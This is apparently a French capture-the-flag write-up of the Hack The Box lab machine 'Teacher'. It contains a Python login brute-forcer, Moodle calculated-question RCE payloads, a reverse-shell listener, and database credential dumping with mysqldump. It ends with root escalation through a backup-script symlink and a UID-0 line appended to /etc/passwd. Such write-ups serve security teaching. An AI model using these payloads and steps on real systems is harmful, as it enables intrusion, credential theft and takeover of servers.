# Teacher writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/16/6/1555750691-capture-du-2019-04-20-10-57-59.png)](https://image.noelshack.com/fichiers/2019/16/6/1555750691-capture-du-2019-04-20-10-57-59.png)

Résumé : <br />

La boîte Teacher étais une boîte assez intéréssante et très amusante, le niveau étais assez simple, juste une bonne enumération étais amplement suffisante. <br />

- Il y'a un fichier sensible dans le dossier /images ou il y'a un code HTTP 200 ou il y'avais un mot de passe sensible mais il manquait un caractère à la fin du mot de passe. <br />

- Ensuite il y'avais un CMS dans le dossier /moodle, et j'ai créer un petit script pour trouver le bon mot de passe. <br />

- Une fois connecté on devais crée un ticket pour avoir une RCE et de bien configuré le ticket pour la RCE.<br />

- Après avoir fais le reverse shell il y'a un fichier de configuration dans le dossier /var/www/html/ et c'est identifiants correspondait à MySQL, du coup j'ai utilisé le programme mysqldump pour dump la base de donnée et de récupérer le mot de passe utilisateur.<br />

- Une fois connecté en tant que user avec la commande su, il y'a un fichier backup dans un dossier précis en bash, et il présentait de nombreuse vulnérabilité pour être root.

Informations
----
    Ip : 10.10.10.153            Created by : Gioo
    Level : Easy                 Base Points : 20

Scan Nmap
----

    root@Seyptoo:~/htb/writeup/Teacher# nmap -sC -sV -oA nmap/teacher 10.10.10.153

    Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-20 11:10 CEST
    Nmap scan report for 10.10.10.153
    Host is up (0.036s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Blackhat highschool
    
Donc le scan nous montre que il y'a seulement le HTTP qui est ouvert sur le port 80, le port par défault et la version n'est pas vulnérable visiblement.

HTTP
----
Donc quand nous accédons à la page il y'a pas grand chose à énumérer c'est un template d'une page HTML et CSS, donc pas grand chose sur cette page cependant je vais lancé une attaque gobuster pour voir les dossiers et d'énumérer.

    root@Seyptoo:~/htb/writeup/Teacher# gobuster -w /usr/share/wordlist/directory-list-2.3-medium.txt -u http://10.10.10.153/ -q -t 50
    /images (Status: 301)
    /css (Status: 301)
    /manual (Status: 301)
    /js (Status: 301)
    /javascript (Status: 301)
    /fonts (Status: 301)
    /moodle (Status: 301)

Donc concrètement il y'a pas mal de dossiers à énumérer on va s'intéréssé à /images et à /moodle précisement. Donc quand j'accède au dossier /images il y'a un fichier assez inhabituel un fichier qui à un code HTTP.

[![forthebadge made-with-python](https://cdn.discordapp.com/attachments/556442801085218827/569129555827228682/unknown.png)](https://cdn.discordapp.com/attachments/556442801085218827/569129555827228682/unknown.png)

Donc comme vous pouvez le voir c'est un fichier assez inhabituel donc on va voir la source de ce fichier pour voir si nous avons des informations.

    root@Seyptoo:~/htb/writeup/Teacher# curl http://10.10.10.153/images/5.png
    Hi Servicedesk,

    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

    Could you guys figure out what the last charachter is, or just reset it?

    Thanks,
    Giovanni
    
Effectivement si nous avons des informations et que dans le mot de passe Th4C00lTheacha il manque un caractère à la fin du coup donc ce mot de passe peut correspondre au CMS /moodle donc l'utilisateur et Giovanni et le mot de passe Th4C00lTheacha?. Donc pour cela j'ai développé un script en Python pour essayer de trouver le dernier caractère du mot de passe en question.

    #!/usr/bin/env python 
    #coding:utf-8

    import requests
    import sys
    import re

    class Teacher:
        def __init__(self, target="http://10.10.10.153/", path="moodle/login/index.php",
                                           end_pass=None):

            '''
                This function will create
                the variables by defaults and testing.
            '''

            self.target_url   = target
            self.path_url     = path
            self.end_password = end_pass

        def send_req(self):
            '''
                This feature will handle the attack
                and send the passwords and test them in function send_req()
            '''
            self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]

            for convert_password in self.end_password:
                plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
                plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}

                req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
                if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
                if not("Invalid login" in "".join(req_http)) :	print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)

    if __name__ == "__main__":
        req = Teacher()
        req.send_req()

Donc si nous lançons le script :

    root@Seyptoo:~/htb/writeup/Teacher# python teacher_bf.py 
    [-] Password not cracked : Th4C00lTheacha*
    [-] Password not cracked : Th4C00lTheacha=
    [-] Password not cracked : Th4C00lTheacha!
    [-] Password not cracked : Th4C00lTheacha/
    [-] Password not cracked : Th4C00lTheacha_
    [-] Password not cracked : Th4C00lTheacha1
    [-] Password not cracked : Th4C00lTheacha2
    [-] Password not cracked : Th4C00lTheacha3
    [-] Password not cracked : Th4C00lTheacha4
    [-] Password not cracked : Th4C00lTheacha5
    [-] Password not cracked : Th4C00lTheacha6
    [-] Password not cracked : Th4C00lTheacha7
    [-] Password not cracked : Th4C00lTheacha8
    [-] Password not cracked : Th4C00lTheacha9

    [+] Password cracked with success : Th4C00lTheacha#
    
Donc le mot de passe est Th4C00lTheacha#, on peut se connecter sans aucun problème et d'énumérer le service. Donc si nous regardons les messages privées de l'utilisateur nous avons des informations assez sympathique.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/16/6/1555753937-capture-du-2019-04-20-11-52-07.png)](https://image.noelshack.com/fichiers/2019/16/6/1555753937-capture-du-2019-04-20-11-52-07.png)

Nous devons crée un QUIZ, ce site vous montre très simplement comment faire un QUIZ https://teaching.unsw.edu.au/moodle-quiz. <br />

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/16/6/1555754559-capture-du-2019-04-20-12-02-21.png)](https://image.noelshack.com/fichiers/2019/16/6/1555754559-capture-du-2019-04-20-12-02-21.png)

Une fois que vous avez créez votre QUIZ il vous suffit de cliquez sur Add > A New Question > Et ensuite de séléctionner Calculated et ensuite de cliquez sur Add. Il rédirige vers une page, et pour les champs obligatoires, mettez quelque chose de random, il y'a une partie très importante pour effectuer notre reverse shell

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/16/6/1555754788-capture-du-2019-04-20-12-06-19.png)](https://image.noelshack.com/fichiers/2019/16/6/1555754788-capture-du-2019-04-20-12-06-19.png)

    {a.`$_GET[0]`}
    {a.`$_GET[0]`;{x}} 
    /*{a*/`$_GET[0]`;//{x}}
    
Ensuite vous sauvegardez la page, cliquez sur Save Change et ensuite sur Next Page c'est là que on peut effectuer notre reverse 
shell vous devez utilisé le paramètre '0' pour effectuer le reverse shell. <br />

Si nous tentons d'envoyez des paquets ICMP avec ping, vous allez voir que nous recevons bien les paquets avec tcpdump.

http://10.10.10.153/moodle/question/question.php[...SNIP...]&0=(ping%20-c%205%2010.10.13.156)

    root@Seyptoo:~/htb/writeup/Teacher# tcpdump -i tun0 icmp -n
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    12:18:07.400460 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5190, seq 1, length 64
    12:18:07.400514 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5190, seq 1, length 64
    12:18:08.402396 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5190, seq 2, length 64
    12:18:08.402467 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5190, seq 2, length 64
    12:18:09.404353 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5190, seq 3, length 64
    12:18:09.404411 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5190, seq 3, length 64
    12:18:10.412116 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5190, seq 4, length 64
    12:18:10.412192 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5190, seq 4, length 64
    12:18:11.412948 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5190, seq 5, length 64
    12:18:11.412994 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5190, seq 5, length 64
    12:18:11.468016 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5205, seq 1, length 64
    12:18:11.468069 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5205, seq 1, length 64
    12:18:12.469553 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5205, seq 2, length 64
    12:18:12.469607 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5205, seq 2, length 64
    12:18:13.475630 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5205, seq 3, length 64
    12:18:13.475683 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5205, seq 3, length 64
    12:18:14.471911 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5205, seq 4, length 64
    12:18:14.471967 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5205, seq 4, length 64
    12:18:15.475007 IP 10.10.10.153 > 10.10.13.156: ICMP echo request, id 5205, seq 5, length 64
    12:18:15.475061 IP 10.10.13.156 > 10.10.10.153: ICMP echo reply, id 5205, seq 5, length 64

Shell 
----

Nous avons un shell sans problème, vous devez utilisé nc et non la commande avec rm, j'ai perdu beaucoup de temps avec ça :rire:

    root@Seyptoo:~/htb/writeup/Teacher# nc -lvnp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from [10.10.10.153] port 1234 [tcp/*] accepted (family 2, sport 46086)
    python -c "import pty;pty.spawn('/bin/bash')" 
    www-data@teacher:/var/www/html/moodle/question$ cd /var/www/html/moodle
    www-data@teacher:/var/www/html/moodle$ cat config.php
    $CFG->dbtype    = 'mariadb';
    $CFG->dblibrary = 'native';
    $CFG->dbhost    = 'localhost';
    $CFG->dbname    = 'moodle';
    $CFG->dbuser    = 'root';
    $CFG->dbpass    = 'Welkom1!';
    $CFG->prefix    = 'mdl_';
   
On dois se connecter sur le serveur MySQL pour récupérer les données, utilisé la commande mysqldump pour dump la base de données.

    www-data@teacher:/var/www/html/moodle$ mysqldump -u root -p moodle > /tmp/dump_database
    Enter password: Welkom1!
    www-data@teacher:/var/www/html/moodle$ cat /tmp/dump_database|grep giovanni
    
Si nous regardons bien il y'a du MD5 tout en bas, on va déchiffrer ça. Mot de passe de gionvanni : expelled. On peut se connecter avec la commande su sur l'utilisateur.

    www-data@teacher:/home$ su - giovanni
    Password: expelled
    giovanni@teacher:~$ wc -c /home/giovanni/user.txt 
    33 /home/giovanni/user.txt
    giovanni@teacher:~$

PrivEsc
----
Il y'a un fichier assez spécial dans le dossier /usr/bin/backup.sh, un fichier backup essayons de lire ce fichier.

    giovanni@teacher:~$ cat /usr/bin/backup.sh
    #!/bin/bash
    cd /home/giovanni/work;
    tar -czvf tmp/backup_courses.tar.gz courses/*;
    cd tmp;
    tar -xf backup_courses.tar.gz;
    chmod 777 * -R;
    
Dans ce cas il y'a rien de bien compliqué nous allons simplement supprimerl les données dans le /tmp. Et ensuite d'allez dans le dossier cd /home/giovanni/work. Ensuite l'idée est de crée un lien symbolique pour root. Ensuite vous pouvez lire le fichier root.txt sans aucun problème.

    giovanni@teacher:~$ rm -rf /home/giovanni/work/tmp
    giovanni@teacher:~$ cd /home/giovanni/work
    giovanni@teacher:/home/giovanni/work$ ln -s /root tmp
    giovanni@teacher:/home/giovanni/work$ cd tmp
    giovanni@teacher:/home/giovanni/work/tmp$ wc -c root.txt
    33 root.txt

[![forthebadge made-with-python](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)

Je créer un mot de passe avec mkpasswd pour mettre cela dans le fichier passwd.

    root@Seyptoo:~/htb/writeup/Teacher# mkpasswd -m sha-512 seyptoo
    $6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00

Donc concrètement je vais ajouter une ligne dans le fichier /etc/passwd pour être root.

    giovanni@teacher:/etc$ echo -e 'seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.:0:0:root:/root:/bin/bash ' >> /etc/passwd

    giovanni@teacher:/etc$ cat passwd
    root:x:0:0:root:/root:/bin/bash
    seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.
    giovanni@teacher:/etc$ su - seyptoo
    Password: seyptoo

    root@teacher:~#

N'hésitez pas à star ma répositorie c'étais une boîte très intéréssante, ou il y'avais beaucoup d'énumération.
